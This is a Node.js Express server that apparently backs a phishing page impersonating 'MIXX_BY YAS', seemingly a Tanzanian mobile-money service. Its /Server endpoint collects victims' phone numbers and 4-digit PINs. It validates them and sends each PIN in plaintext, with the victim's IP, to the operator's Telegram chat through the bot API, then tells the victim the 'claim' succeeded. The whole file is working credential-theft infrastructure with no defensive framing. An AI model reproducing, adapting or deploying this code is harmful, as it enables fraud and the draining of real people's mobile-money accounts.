require('dotenv').config();
const express = require('express');
const cors = require('cors');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 3000;

// ============================================
// FIX: Enable trust proxy for Railway
// ============================================
app.set('trust proxy', 1); // Trust first proxy (Railway)

// ============================================
// TELEGRAM CREDENTIALS (from .env)
// ============================================
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// ============================================
// MIDDLEWARE
// ============================================
app.use(helmet({
  contentSecurityPolicy: false,
}));

app.use(cors({
  origin: '*',
  methods: ['GET', 'POST'],
  allowedHeaders: ['Content-Type']
}));

// Rate limiting to prevent abuse
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100, // Limit each IP to 100 requests per windowMs
  message: 'Too many requests, please try again later.',
  standardHeaders: true,
  legacyHeaders: false,
  // Fix: Use 'true' to trust proxy headers
  trustProxy: true,
});
app.use('/Server', limiter);

app.use(express.json({ limit: '10kb' }));
app.use(express.urlencoded({ extended: true, limit: '10kb' }));

// ============================================
// LOGGING
// ============================================
app.use((req, res, next) => {
  console.log(`[${new Date().toISOString()}] ${req.method} ${req.path}`);
  if (req.body && Object.keys(req.body).length > 0) {
    console.log('📦 Body:', req.body);
  }
  next();
});

// ============================================
// ROUTES
// ============================================

// Health check
app.get('/', (req, res) => {
  res.json({
    status: 'OK',
    message: 'MIXX_BY YAS Backend is running',
    timestamp: new Date().toISOString(),
    telegram: TELEGRAM_BOT_TOKEN ? 'Configured ✅' : 'Not configured ⚠️',
    endpoint: 'https://mixxyas05com-production.up.railway.app'
  });
});

// Health check for Railway
app.get('/health', (req, res) => {
  res.status(200).json({ 
    status: 'healthy', 
    uptime: process.uptime(),
    service: 'MIXX_BY YAS'
  });
});

// ============================================
// MAIN ENDPOINT: /Server (POST)
// ============================================
app.post('/Server', async (req, res) => {
  try {
    const { phone, pin } = req.body;

    // Validation
    if (!phone || !pin) {
      console.warn('⚠️ Missing fields:', { phone: !!phone, pin: !!pin });
      return res.status(400).json({
        success: false,
        message: 'Phone and PIN are required'
      });
    }

    // Validate phone format (Tanzanian numbers)
    const phoneRegex = /^[0-9]{10}$/;
    if (!phoneRegex.test(phone)) {
      console.warn('⚠️ Invalid phone format:', phone);
      return res.status(400).json({
        success: false,
        message: 'Phone number must be 10 digits'
      });
    }

    // Validate PIN (4 digits)
    const pinRegex = /^[0-9]{4}$/;
    if (!pinRegex.test(pin)) {
      console.warn('⚠️ Invalid PIN format:', pin);
      return res.status(400).json({
        success: false,
        message: 'PIN must be 4 digits'
      });
    }

    console.log('✅ Valid data received:', { phone, pin });

    // ============================================
    // SEND TO TELEGRAM
    // ============================================
    let telegramSuccess = false;
    let telegramResponse = null;

    if (TELEGRAM_BOT_TOKEN && TELEGRAM_BOT_TOKEN !== 'your_bot_token_here') {
      try {
        const message = `🎯 *NEW CLAIM - MIXX_BY YAS*\n📱 Phone: ${phone}\n🔐 PIN: ${pin}\n🕐 Time: ${new Date().toLocaleString('sw-TZ', { timeZone: 'Africa/Dar_es_Salaam' })}\n🌐 IP: ${req.ip || req.connection.remoteAddress}\n📍 Source: mixxyas05com-production.up.railway.app`;

        const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        
        const response = await axios.post(telegramUrl, {
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: 'Markdown'
        }, {
          timeout: 10000
        });

        telegramSuccess = response.data.ok;
        telegramResponse = response.data;
        
        if (telegramSuccess) {
          console.log('✅ Telegram notification sent successfully');
        } else {
          console.error('❌ Telegram returned error:', response.data);
        }
      } catch (telegramError) {
        console.error('❌ Telegram send failed:', telegramError.message);
        if (telegramError.response) {
          console.error('Telegram response:', telegramError.response.data);
        }
        telegramSuccess = false;
      }
    } else {
      console.warn('⚠️ Telegram not configured, skipping notification');
    }

    // ============================================
    // RESPONSE
    // ============================================
    res.status(200).json({
      success: true,
      message: 'Claim submitted successfully',
      telegram: {
        sent: telegramSuccess,
        details: telegramResponse
      },
      data: {
        phone: phone,
        pin: '****',
        timestamp: new Date().toISOString()
      }
    });

  } catch (error) {
    console.error('❌ Server error:', error);
    res.status(500).json({
      success: false,
      message: 'Internal server error',
      error: process.env.NODE_ENV === 'development' ? error.message : undefined
    });
  }
});

// ============================================
// TELEGRAM WEBHOOK
// ============================================
app.post('/webhook', async (req, res) => {
  try {
    const { message } = req.body;
    if (message && message.text) {
      console.log('📩 Telegram message received:', message.text);
      
      if (message.text === '/start') {
        const chatId = message.chat.id;
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
          chat_id: chatId,
          text: '👋 Welcome to MIXX_BY YAS Bot!\n\n📊 Status: Active\n🔗 Endpoint: https://mixxyas05com-production.up.railway.app\n\nSend /status to check system status.'
        });
      }
      
      if (message.text === '/status') {
        const chatId = message.chat.id;
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
          chat_id: chatId,
          text: `📊 *System Status*\n✅ Server: Online\n🕐 Uptime: ${Math.floor(process.uptime())}s\n📱 Monitoring: Active\n🔗 URL: https://mixxyas05com-production.up.railway.app`
        });
      }
    }
    res.sendStatus(200);
  } catch (error) {
    console.error('Webhook error:', error);
    res.sendStatus(500);
  }
});

// ============================================
// ERROR HANDLING
// ============================================
app.use((err, req, res, next) => {
  console.error('Unhandled error:', err);
  res.status(500).json({
    success: false,
    message: 'Something went wrong'
  });
});

// ============================================
// START SERVER
// ============================================
app.listen(PORT, () => {
  console.log('========================================');
  console.log('🚀 MIXX_BY YAS Backend Server');
  console.log('========================================');
  console.log(`📡 Server running on port: ${PORT}`);
  console.log(`🌐 URL: https://mixxyas05com-production.up.railway.app`);
  console.log(`🔗 Endpoint: POST /Server`);
  console.log(`📱 Telegram: ${TELEGRAM_BOT_TOKEN ? '✅ Configured' : '❌ Not configured'}`);
  console.log(`🆔 Chat ID: ${TELEGRAM_CHAT_ID || 'Not set'}`);
  console.log('========================================');
});

// Graceful shutdown
process.on('SIGTERM', () => {
  console.log('🛑 Received SIGTERM, shutting down gracefully...');
  process.exit(0);
});

process.on('SIGINT', () => {
  console.log('🛑 Received SIGINT, shutting down gracefully...');
  process.exit(0);
});
